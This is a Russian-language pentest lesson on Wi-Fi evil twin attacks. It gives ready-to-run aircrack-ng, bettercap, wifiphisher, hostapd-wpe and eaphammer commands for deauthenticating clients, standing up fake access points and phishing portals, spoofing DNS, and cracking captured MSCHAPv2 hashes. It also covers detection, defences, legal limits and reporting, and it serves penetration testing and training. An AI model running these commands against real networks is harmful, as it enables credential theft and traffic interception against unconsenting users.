Evil twin — поддельная точка доступа с именем (SSID) легитимной сети. Клиент подключается к ней автоматически, после чего атакующий контролирует его трафик и может показать фальшивый портал входа. Это классический физический/радио-вектор против беспроводного периметра: он эксплуатирует доверие клиента к **имени сети**, а не к её подлинности. Урок опирается на [`network-wireless-80211`](network-wireless-80211), а последующий перехват — на [`network-mitm`](network-mitm).

## Модель угроз и почему это работает

Клиент (ноутбук, телефон) хранит список «известных» сетей и **автоматически** переподключается к ним. При этом он обычно:

- доверяет **SSID**, а не BSSID/каналу;
- не проверяет, что AP «та самая» (если сеть открытая или WPA2-PSK с известным паролем);
- ищет знакомую сеть, если текущая пропала.

Evil twin ставит AP с тем же SSID, часто с более сильным сигналом, и клиент выбирает её. Для WPA2-Enterprise добавляется подделка RADIUS (hostapd-wpe/eaphammer): если клиент **не валидирует сертификат сервера**, он отдаёт атакующему MSCHAPv2-хэш, который затем оффлайн-брутится (см. `network-radius-8021x`).

## Подготовка радио-стека

Нужны адаптеры с поддержкой **monitor mode** (для наблюдения/deauth) и **AP mode** (для двойника). Один адаптер может совмещать AP+mon, но стабильнее — два.

```bash
# Проверить адаптеры и драйверы
iw dev
iw list | grep -A8 'Supported interface modes'
# Поставить в monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0        # -> wlan0mon
# Вернуть в managed
sudo airmon-ng stop wlan0mon
# Список сетей и клиентов
sudo airodump-ng wlan0mon
# Целевая сеть на канале с клиентами
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
```

`airodump-ng` покажет SSID, BSSID, канал, шифрование и подключённых клиентов (`STATION`). Выбирайте сеть с активными клиентами — иначе двойник никто не увидит.

## Deauth, KARMA и провокация переподключения

Клиент останется на легитимной AP, пока сигнал есть. Его «выбивают» deauth-кадрами, и он ищет сеть заново. На WPA3/PMF (802.11w) deauth не сработает — кадры защищены.

```bash
# Deauth конкретного клиента или широковещательно
sudo aireplay-ng --deauth 15 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon   # бесконечный
# Bettercap как альтернатива
sudo bettercap -iface wlan0mon
> wifi.deauth AA:BB:CC:DD:EE:FF
```

**KARMA** (и его развитие MANA) эксплуатирует клиентов, которые рассылают **probe-request** с именами знакомых сетей: атакующий отвечает на **любой** probe, представляясь запрошенной сетью. Клиент подключается к «своей» сети, даже если её нет рядом. Особенно эффективно против устройств с включённым автоподключением.

## Инструменты поднятия двойника

| Инструмент | Назначение | Особенность |
|------------|-----------|-------------|
| wifiphisher | evil twin + готовые порталы | шаблоны login/oauth/update |
| hostapd-wpe | WPA2-Enterprise фейк | собирает MSCHAPv2-хэши |
| eaphammer | Enterprise-атаки, порталы | EAP-даунгрейд, GTC |
| bettercap | AP + MITM в одном | Wi-Fi + сетевые атаки |
| airgeddon | сценарии wireless-атак | меню-обёртка |
| mana-toolkit | KARMA/MANA | автоматическое подключение |

```bash
# wifiphisher: двойник + фишинговый портал
sudo wifiphisher -e "CorpWiFi" -p oauth-login
# bettercap: свой AP
sudo bettercap -iface wlan0 -eval "set wifi.ap.ssid CorpWiFi; wifi.ap on"
# hostapd-wpe: Enterprise-фейк
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# eaphammer
sudo ./eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap --creds
```

## Captive portal: сбор учётных данных

Портал входа (гостевой Wi-Fi, отель, аэропорт) — знакомая страница, которую пользователь ожидает увидеть. Поддельный портал имитирует её и **собирает логины/пароли/OTP**. Чтобы портал появился сразу, подменяют **captive-portal detection** (клиент сам запрашивает `connectivitycheck.gstatic.com`, `captive.apple.com` и т.п.) через DNS-спуфинг — см. `network-dhcp` и `network-arp`.

```bash
# rogue DHCP + DNS-спуфинг, чтобы клиент сам открыл портал
# (bettercap умеет dhcp.spoof + dns.spoof)
sudo bettercap -iface wlan0mon
> set dhcp.spoof on
> set dns.spoof.domains connectivitycheck.gstatic.com,captive.apple.com
> set dns.spoof.address 10.0.0.1
> dns.spoof on
# Портал-страница: копия входа (wifiphisher --template) -> POST на collector
```

HTTPS-порталы сложнее имитировать (сертификат), но фишинг на похожем домене + валидный TLS для своего домена работает. OAuth/SSO-порталы — копия страницы провайдера.

## Разобранный пример: полный сценарий

```bash
# 1. Разведка: найти цель с клиентами
sudo airodump-ng wlan0mon
# -> BSSID AA:BB:CC:DD:EE:FF  SSID GuestWiFi  CH 6  WPA2
# 2. Сбить клиента с легитимной AP
sudo aireplay-ng --deauth 15 -a AA:BB:CC:DD:EE:FF wlan0mon
# 3. Поднять двойника с порталом на том же SSID
sudo wifiphisher -e "GuestWiFi" -p oauth-login
# 4. Клиент подключается, открывает портал, вводит логин
# -> креды видны в консоли/логе wifiphisher
# 5. Перехват трафика подключённого клиента (MITM)
sudo bettercap -iface wlan0mon -eval "net.sniff on; http.proxy on"
```

Обратите внимание: шаг 5 зависит от того, что клиент уже подключён к вашему AP, а DHCP/DNS вы контролируете.

## Атаки после подключения

Двойник — это только точка входа. Далее:

- **MITM** — перехват/подмена трафика (`network-mitm`, bettercap).
- **SSL-strip** — понижение HTTPS до HTTP там, где нет HSTS.
- **DNS-спуфинг** — подмена ответов, фишинг.
- **Rogue DHCP** — выдача себя как шлюз/DNS.
- **Port-stealing / captive-portal bypass** — обход изоляции клиентов.
- **Credential harvesting** через поддельные страницы входа.

## Детект и защита

- **WPA3 + PMF (802.11w)** — защищает management-кадры, ломает deauth-часть.
- **Проверка сертификата RADIUS** на клиенте (WPA2-Enterprise) — не даёт подключиться к фейку.
- **Отключить автоподключение** к открытым сетям; профили с фиксированным **BSSID**.
- **VPN** поверх Wi-Fi для чувствительного трафика (шифрование выше L2).
- **WIDS/WIPS** — детект двойников: один SSID с разными BSSID/шифрованием/вендором.
- **802.1X + EAP-TLS** — сертификаты с двух сторон, фейк не проходит.
- **HSTS/HTTPS-only** на клиентах против strip.

```bash
# WIDS-подобный детект: один SSID — несколько BSSID
sudo airodump-ng wlan0mon | awk '{print $NF, $(NF-1)}'   # SSID/BSSID
# Разные OUI у одного SSID — признак двойника
```

## Частые ошибки

- **Двойник на том же канале с конфликтом** — клиент может не переключиться; иногда лучше другой канал/канал легитимной AP с сильным сигналом.
- **Забыть deauth** — клиент останется на легитимной AP.
- **Портал без HTTPS-вида** — пользователь заподозрит подделку.
- **Игнорировать PMF** — на WPA3 deauth-часть не сработает.
- **Собирать пароли без изоляции** — риск утечки собранного.
- **Не учитывать законодательство** — Wi-Fi-атаки в чужих сетях незаконны.
- **Один адаптер** — deauth и AP одновременно нестабильны.

## KARMA/MANA в деталях

KARMA отвечает на probe-request клиента, выдавая себя за запрошенную сеть. MANA добавляет более умную обработку (запоминает имена сетей, подделывает BSSID, работает с несколькими клиентами). Клиентские ОС частично защитились (сравнение BSSID, случайные MAC), но старые/встроенные устройства всё ещё уязвимы.

```bash
# mana-toolkit: старт с KARMA/MANA-логикой
# (см. /etc/mana-toolkit/hostapd-mana.conf, режим hostapd-mana)
# Признак: AP с одним SSID и множеством BSSID в логах
```

## Юридические и этические границы

Wi-Fi-атаки **запрещены** вне авторизованного теста: перехват чужих сетей уголовно наказуем. Даже «проверка» открытой сети соседа — нарушение. В пентесте:

- Только согласованные SSID/диапазоны.
- Не собирать реальные учётные данные пользователей без явного разрешения.
- Хранить собранное безопасно, удалять после отчёта.
- Согласовывать физический доступ (радиус действия AP).

## Что писать в отчёте

- SSID/BSSID двойника и канал.
- Как клиенты переключались (deauth/KARMA).
- Что удалось собрать (креды — без раскрытия в открытом виде).
- Рекомендации: WPA3+PMF, отключение автоподключения, проверка сертификата, WIDS.

## Что дальше / решение

- Хотите собрать **учётные данные** → captive portal (wifiphisher/eaphammer) + DNS-спуфинг портала.
- Нужен **перехват трафика** подключённого клиента → `network-mitm` + bettercap (`net.sniff`).
- Целевая сеть — **WPA2-Enterprise** → `network-radius-8021x` (hostapd-wpe/eaphammer, брут MSCHAPv2).
- Нужна **стойкость защиты** → WPA3+PMF, EAP-TLS, WIDS.
- Для лабораторной практики — изолированный диапазон и свои устройства.

Решение (алгоритм): 1) выбрать цель с клиентами; 2) поднять AP-адаптер; 3) сбить клиента (deauth/KARMA); 4) поднять двойника на том же SSID; 5) показать портал/перехватить трафик; 6) зафиксировать и дать рекомендации.

## Даунгрейд WPA2-Enterprise и EAP

Когда сеть использует WPA2-Enterprise, клиент аутентифицируется через RADIUS (802.1X). Двойник может **имитировать** RADIUS-сервер и провести даунгрейд EAP:

- **EAP-MD5** — сервер присылает MD5-challenge, клиент отдаёт хэш (легко брутится).
- **PEAP/MSCHAPv2** — клиент отдаёт **MSCHAPv2**-пару challenge/response; если не проверяет сертификат сервера, хэш уходит атакующему и брутится оффлайн (`hashcat -m 5500`).
- **EAP-GTC** — иногда просит **открытый пароль**.
- **EAP-TLS** — требует клиентского сертификата; фейк не проходит (это правильная защита).

```bash
# hostapd-wpe: принимает клиентов и печатает креды/хэши
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# eaphammer: даунгрейд EAP, сбор кредов и порталы
sudo ./eaphammer -i wlan0 --essid CorpWiFi --auth wpa-eap --creds
# Взлом собранного MSCHAPv2
hashcat -m 5500 hash.txt wordlist.txt
```

Ключевой вывод для защиты: **клиент обязан валидировать сертификат RADIUS** (`ca_cert`, домен в `domain_suffix_match`). Без этого Enterprise-сеть ничуть не безопаснее открытой — двойник собирает материал для оффлайн-брута.

## Лабораторная практика и оборудование

Чтобы тренироваться легально, нужен изолированный диапазон и своё оборудование:

- **Два адаптера**: один в monitor mode, второй в AP mode (или один с AP+mon, но нестабильно).
- **Изоляция**: отдельный роутер/канал, чтобы не задеть чужие сети.
- **Клиент-жертва**: старый телефон/ноутбук с включённым автоподключением.
- **Логи**: `airodump-ng -w`, дампы bettercap, логи wifiphisher/eaphammer.

```bash
# Базовый сценарий лаборатории
sudo airmon-ng check kill && sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon -w lab --output-format pcap
sudo aireplay-ng --deauth 10 -a <LAB_BSSID> wlan0mon
sudo wifiphisher -e "<LAB_SSID>" -p oauth-login
# После — разбор: какой клиент подключился, что ввёл, как отреагировала ОС
```

## Метрики успеха и отчётность

| Метрика | Что показывает |
|---------|----------------|
| Клиенты, переключившиеся на двойника | эффективность deauth/KARMA |
| Введённые креды | успех портала |
| Собранные MSCHAPv2-хэши | даунгрейд Enterprise |
| Время до подключения | скорость провокации |
| Обнаружение WIDS | зрелость защиты |

Отчёт должен связывать технику с **бизнес-риском** (кража учётных данных, доступ во внутреннюю сеть) и давать конкретные рекомендации.
